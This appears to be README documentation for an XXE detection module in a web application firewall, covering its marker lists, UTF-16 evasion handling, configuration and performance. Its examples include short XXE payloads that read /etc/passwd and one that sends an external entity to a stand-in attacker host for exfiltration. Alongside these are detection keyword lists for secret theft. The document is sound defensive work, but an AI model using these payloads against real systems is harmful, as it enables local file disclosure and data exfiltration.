# XXE-Attack-Detect DFA

Detects XML External Entity (XXE) injection payloads.  XXE attacks exploit XML
parsers that resolve external entity references — allowing an attacker to read
arbitrary local files (`file:///etc/passwd`), perform SSRF against internal services,
or exfiltrate data out-of-band.  The attack surface includes any endpoint that
accepts XML, SOAP, or SVG input, as well as endpoints where an attacker can smuggle
XML inside a form field or JSON value.

The detector additionally handles **UTF-16 encoded payloads** — a common evasion
technique used to bypass ASCII-only WAF filters.

---

## How it works

Detection requires **one marker from list A AND one marker from list B** to be
present in the same inspected string.  A single marker from either list alone is
insufficient — the conjunction eliminates false positives on legitimate XML that
uses `DOCTYPE` or `ENTITY` declarations without external references.

### List A — XML entity / include markers (2 markers)

| Marker | Significance |
|--------|--------------|
| `entity` | XML `ENTITY` declaration — required to define an external entity |
| `xi:include` | XInclude include directive — alternative to `ENTITY` for external inclusion |

### List B — suspicious target / context markers (10 markers)

| Marker | Significance |
|--------|--------------|
| `xxe` | Named entity token used in most XXE proof-of-concept payloads |
| `system` | `SYSTEM` keyword that introduces an external identifier URI |
| `etc/password` | Canonical LFI target path |
| `eval` | PHP/JS eval function — used in XXE-to-RCE chains |
| `exfil` | Data exfiltration marker |
| `xmlns:xi` | XInclude namespace binding |
| `send` | Common exfiltration verb in SSRF payloads |
| `doctype` | `DOCTYPE` declaration wrapper |
| `soap` | SOAP envelope — XXE frequently targets SOAP services |
| `file` | `file://` URI scheme used to reference local files |

### UTF-16 evasion bypass

Before running the two-list check, the detector attempts to decode the input as
UTF-16LE and UTF-16BE if the byte pattern suggests NUL-interleaved encoding
(≥ 50 % of even-position or odd-position bytes are zero).  It also strips embedded
NUL bytes when the pattern suggests partial UTF-16 encoding.

After decoding each candidate view, the full list A + list B check is re-applied.
The `decoded_utf16` field in the finding is set to `true` when evasion decoding was
needed.

### Detection flow

```
input
 ├─ detect_view(input, decoded_utf16=false)
 │    ├─ list_a.find(input)   → Some(marker_a)
 │    └─ list_b.find(input)   → Some(marker_b)
 │         ↓ both found → XxeAttackMatch { decoded_utf16: false }
 └─ utf16_views(input)   [ if plain match failed ]
      ├─ decode_utf16_units(bytes, Endian::Little)
      ├─ decode_utf16_units(bytes, Endian::Big)
      └─ strip embedded NULs
           ↓ detect_view(decoded, decoded_utf16=true)
```

### Engine selection

| Mode | Mechanism |
|------|-----------|
| Default | Aho-Corasick (case-insensitive, leftmost-first match) on both lists |
| `--enable-vectorscan` | Vectorscan `BlockDatabase` with `CASELESS \| SINGLEMATCH` — one SIMD pass per list |

---

## Enabling the module

Add `XXE_attack_detect: true` to your DFA config file (default location
`rules/dfa/config.yaml`) and load it with the `--dfa-load` flag:

```yaml
# rules/dfa/config.yaml
DFA-Rules:
  SQLi_comments_detect: true
  Overflow_detect: true
  SSTI_detect: true
  SSI_injection_detect: true
  ESI_injection_detect: true
  CRLF_injection_detect: true
  Request_Smuggling_detect: true
  NOSQL_injection_detect: true
  XXE_attack_detect: true
  Anti_exposed_backup: true
```

Start the WAF:

```sh
krakenwaf \
  --no-tls \
  --listen 0.0.0.0:8443 \
  --upstream http://127.0.0.1:8080 \
  --dfa-load rules/dfa/config.yaml
```

To enable Vectorscan SIMD acceleration (requires `vectorscan-engine` Cargo feature):

```sh
krakenwaf \
  --no-tls \
  --listen 0.0.0.0:8443 \
  --upstream http://127.0.0.1:8080 \
  --dfa-load rules/dfa/config.yaml \
  --enable-vectorscan
```

To disable, set the value to `false` or remove the line entirely.

---

## Detection finding

When a request is blocked the following structured finding is emitted (visible in
logs, the Prometheus `/metrics` endpoint, and the SQLite database):

| Field | Value |
|-------|-------|
| Title | `DFA XXE attack detection` |
| Severity | `High` |
| CWE | [CWE-611](https://cwe.mitre.org/data/definitions/611.html) — Improper Restriction of XML External Entity Reference |
| Reference | [OWASP – XXE Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing) |
| `rule_match` | `dfa::xxe_attack_detect:list_A=<marker-a> list_B=<marker-b> decoded_utf16=<bool>` |
| `rule_line_match` | `dfa/xxe_attack_detect.rs:generated` |

---

## Examples

### Blocked requests

```
POST /api  body=<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>
   → 403   (list_A=entity  list_B=xxe, system, file)

POST /soap  body=<xi:include href="file:///etc/passwd" xmlns:xi="x"/>
   → 403   (list_A=xi:include  list_B=file, xmlns:xi)

POST /upload  body=<DOCTYPE foo [<!ENTITY send SYSTEM "http://attacker.test/exfil">]>
   → 403   (list_A=entity  list_B=send, exfil)

POST /api  body=<UTF-16 encoded xxe payload>
   → 403   (decoded_utf16=true — evasion detected)
```

### Allowed requests (single list only — no conjunction)

```
POST /api  body=<!ENTITY harmless "value">
   → forwarded   (list_A=entity — list_B absent)

POST /data  body=<data>file:///etc/passwd</data>
   → forwarded   (list_B=file — list_A absent)

POST /xml   body=<?xml version="1.0"?><root><item>value</item></root>
   → forwarded   (no markers)
```

---

## False-positive guidance

The two-list conjunction means legitimate XML with `DOCTYPE` or `ENTITY`
declarations (common in EPUB, SVG, and some SOAP dialects) only fires when it also
contains a suspicious target marker such as `SYSTEM`, `file`, or `exfil`.  Internal
DTD-only documents rarely contain these markers in combination.

If your application legitimately processes XML with external entity declarations:

1. **Allow-path**: add the specific path to `rules/allowpaths/lists.yaml`.
2. **Disable the module**: set `XXE_attack_detect: false` in the DFA config.

---

## Performance notes

* **Aho-Corasick** compiles both lists into single automata at startup; each list
  requires one O(n) pass per request.
* **Vectorscan** processes each list in a single SIMD scan, terminating on first
  match (`SINGLEMATCH`).
* UTF-16 decoding is gated behind a fast structural check (`has_utf16_nul_shape`);
  inputs with no NUL interleaving skip decoding entirely.
* No heap allocation is performed in the fast path; the UTF-16 decoded views are
  only allocated when the structural check fires.

---

## Source files

| File | Purpose |
|------|---------|
| `src/dfa/xxe_attack_detect.rs` | Detector, list tables, Aho-Corasick/Vectorscan matchers, UTF-16 decoder, unit tests |
| `src/dfa/mod.rs` | Module registration, `DfaConfig` field, `DfaManager` field, `inspect()` call |
| `src/waf/engine.rs` | Integration — `inspect()` called in the main WAF pipeline |
| `rules/dfa/config.yaml` | Default config — `XXE_attack_detect: true` |
